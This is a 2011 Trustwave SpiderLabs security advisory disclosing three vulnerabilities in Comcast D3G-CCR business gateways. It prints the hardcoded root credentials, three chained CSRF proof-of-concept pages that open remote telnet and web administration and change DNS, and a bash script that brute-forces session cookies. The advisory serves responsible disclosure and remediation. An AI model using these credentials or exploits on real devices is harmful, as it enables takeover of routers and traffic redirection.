@@ -1,0 +1,221 @@
+Trustwave's SpiderLabs Security Advisory TWSL2011-002:
+Vulnerabilities in Comcast DOCSIS 3.0 Business Gateways
+(D3G-CCR)
+
+https://www.trustwave.com/spiderlabs/advisories/TWSL2011-002.txt
+
+Published: 2011-02-04
+Version: 1.0
+
+Vendor: Comcast (http://comcast.com)
+Product: Comcast DOCSIS 3.0 Business Gateway - D3G-CCR
+Version affected:  Versions prior to 1.4.0.49.2
+
+Product description:
+The Comcast DOCSIS 3.0 Business Gateway provides end-user termination of
+cable internet services for Comcast Business Class customers with enhanced
+services including Network Address Translation (NAT), firewalling, and
+Virtual Private Network (VPN) termination.
+
+Credit: Zack Fasel and Matthew Jakubowski of Trustwave's SpiderLabs
+
+Finding 1: Static Credentials
+CVE: CVE-2011-0885
+
+All D3G-CCR gateways provided by Comcast have an administrative
+login of "mso" with the password of "D0nt4g3tme".  These passwords
+are not provided as a part of the installation of the device and are
+not recommended to be changed, thus the majority of users are unaware
+of the default configuration.
+
+With these default credentials, internal attackers can modify device
+configurations to leverage more significant attacks, including redirection
+of DNS requests, creation of a remote VPN termination point, and
+modification of NAT entries.  These credentials provide access to the web
+interface for management, as well as a telnet interface that provides shell
+access to the device.  The mso login provides shell as UID 0 (root).
+
+
+Finding 2: Cross Site Request Forgery (CSRF)
+CVE: CVE-2011-0886
+D3G-CCR gateways provided by Comcast permit CSRF attacks against
+numerous management pages allowing an attacker to embed in a webpage a
+malicious request against the gateway's management interface.  Through
+this, an attacker can modify device configuration and enable remote
+administration via a telnet shell and http.
+
+The following Proof of Concept (PoC) connects to the gateway, logs in,
+modifies the remote administration to allow any user to connect externally,
+and modifies the DNS information.
+
+## d3g-csrf-poc.htm
+
+<html>
+<body>
+<iframe src="./d3g-csrf-poc-1.htm" width="1" height="1">
+</iframe>
+<iframe src="./d3g-csrf-poc-2.htm" width="1" height="1">
+</iframe>
+<iframe src="./d3g-csrf-poc-3.htm" width="1" height="1">
+</iframe> </body> </html>
+
+## d3g-csrf-poc-1.htm
+
+<html>
+<body>
+<form action="http://10.1.10.1/goform/login" method="post"
+	name="tF">
+<input type="hidden" name="user" value="mso" />
+<input type="hidden" name="pws" value="D0nt4g3tme" />
+</form> <script> document.tF.submit(); </script> </body>
+</html>
+
+## d3g-csrf-poc-2.htm
+
+<html>
+<body>
+<form action="http://10.1.10.1/goform/RemoteRange"
+name="RMangement" method="post"> <input type="hidden"
+value="feat-admin-remote" name="file"> <input type="hidden"
+value="admin/" name="dir"> <input type="hidden"
+name="RemoteRange" value="0" /> <input type="hidden"
+name="rm_access" value="on" /> <input type="hidden"
+name="Remote0" value="0.0.0.0,0.0.0.0,1" /> <input
+type="hidden" name="http_port" value="8080" /> <input
+type="hidden" name="http_enable" value="on" /> <input
+type="hidden" name="http_flag" value="1" /> <input
+type="hidden" name="msoremote_enableCheck" value="on" />
+<input type="hidden" name="mso_remote_enable" value="1" />
+<input type="hidden" name="remote_enable" value="0" />
+<input type="hidden" name="https_enable" value="on" />
+<input type="hidden" name="https_port" value="8181" />
+<input type="hidden" name="https_flag" value="1" /> <input
+type="hidden" name="telnet_enable" value="on" /> <input
+type="hidden" name="telnet_port" value="2323" /> <input
+type="hidden" name="telnet_flag" value="1" /> <input
+type="hidden" name="Remote1=" value="" /> </form> </body>
+</html> <script>
+setTimeout("document.RMangement.submit()",4000);
+</script>
+</body>
+</html>
+
+## d3g-csrf-poc-3.htm
+
+<html>
+<body>
+<form name="WanIPform"
+action="http://10.1.10.1/goform/Basic" method="post"> <input
+type="hidden" value="feat-wan-ip" name="file"> <input
+type="hidden" value="admin/" name="dir"> <input
+type="hidden" value="Fixed" name="DNSAssign"> <input
+type="hidden" value="0" name="dhcpc_release"> <input
+type="hidden" value="0" name="dhcpc_renew"> <input
+type="hidden" value="" name="domain_name"> <input
+type="hidden" value="" name="WDn"> <input type="hidden"
+name="SysName" value="" /> <input type="hidden"
+name="manual_dns_enable" value="on" /> <input type="hidden"
+name="DAddr" value="4.2.2.1" /> <input type="hidden"
+name="DAddr0" value="4" /> <input type="hidden"
+name="DAddr1" value="2" /> <input type="hidden"
+name="DAddr2" value="2" /> <input type="hidden"
+name="DAddr3" value="1" /> <input type="hidden"
+name="PDAddr" value="4.2.2.2" /> <input type="hidden"
+name="PDAddr0" value="4" /> <input type="hidden"
+name="PDAddr1" value="2" /> <input type="hidden"
+name="PDAddr2" value="2" /> <input type="hidden"
+name="PDAddr3" value="2" /> </form> <script>
+setTimeout("document.WanIPform.submit()",5000);
+</script>
+</body>
+</html>
+
+If the PoC was embedded in any web page the targeted user visited while
+logged into the device, the attacker would be provided remote
+administration in to the gateway device include a telnet shell.  This would
+allow the attacker to redirect traffic to a malicious end-point.
+
+
+Finding 3: Weak Session Management 
+CVE: CVE-2011-0887
+D3G-CCR gateways provided by Comcast utilize a predictable value to
+validate the active web management portal session.  The epoch time of
+beginning of the session is stored as a cookie labeled "userid".  This
+provides a predictable range of session IDs that can be brute-forced.
+
+The following PoC attempts to brute force the session IDs by requesting the
+admin page with an incrementing cookie and determining whether it wants to
+redirect to login.asp.
+
+## d3g-session-poc.sh
+
+#!/bin/bash
+start=1267604160
+end=1267605960
+for (( i=$start; i<=$end; i++)) do if [ `curl -sb userid=$i
+http://10.1.10.1/admin/index.asp | grep -c login.asp` -lt
+"1" ] then echo "Session ID Found:  $i"
+fi
+if [ $(($i % 100)) -eq "0" ]
+then echo "Currently at $i"
+fi
+done
+
+Through this, an attacker can brute-force the possible valid session IDs.
+Sessions do by default expire within 10 minutes, thus the attack window is
+limited but can be leveraged with other attack methods.
+
+
+Vendor Response:
+These issues have been addressed as of version 1.4.0.49.2
+
+Remediation Steps:
+In order to determine if the correct version is installed, users should
+view the "About" link in the management interface. Versions 1.4.0.49.2 and
+above have been corrected.
+
+Vendor Communication Timeline:
+08/30/10 - Vulnerability disclosed
+01/21/11 - Patch Released
+02/04/11 - Advisory Published
+
+Revision History:
+1.0 Initial publication
+
+
+About Trustwave:
+Trustwave is the leading provider of on-demand and subscription-based
+information security and payment card industry compliance management
+solutions to businesses and government entities throughout the world. For
+organizations faced with today's challenging data security and compliance
+environment, Trustwave provides a unique approach with comprehensive
+solutions that include its flagship TrustKeeper compliance management
+software and other proprietary security solutions. Trustwave has helped
+thousands of organizations--ranging from Fortune 500 businesses and large
+financial institutions to small and medium-sized retailers--manage
+compliance and secure their network infrastructure, data communications and
+critical information assets. Trustwave is headquartered in Chicago with
+offices throughout North America, South America, Europe, Africa, China and
+Australia. For more information, visit https://www.trustwave.com
+
+About Trustwave's SpiderLabs:
+SpiderLabs(R) is the advanced security team at Trustwave focused on
+application security, incident response, penetration testing, physical
+security and security research. The team has performed over a thousand
+incident investigations, thousands of penetration tests and hundreds of
+application security tests globally. In addition, the SpiderLabs Research
+team provides intelligence through bleeding-edge research and proof of
+concept tool development to enhance Trustwave's products and services.
+https://www.trustwave.com/spiderlabs
+
+Disclaimer:
+The information provided in this advisory is provided "as is" without
+warranty of any kind. Trustwave disclaims all warranties, either express or
+implied, including the warranties of merchantability and fitness for a
+particular purpose. In no event shall Trustwave or its suppliers be liable
+for any damages whatsoever including direct, indirect, incidental,
+consequential, loss of business profits or special damages, even if
+Trustwave or its suppliers have been advised of the possibility of such
+damages. Some states do not allow the exclusion or limitation of liability
+for consequential or incidental damages so the foregoing limitation may not
+apply.
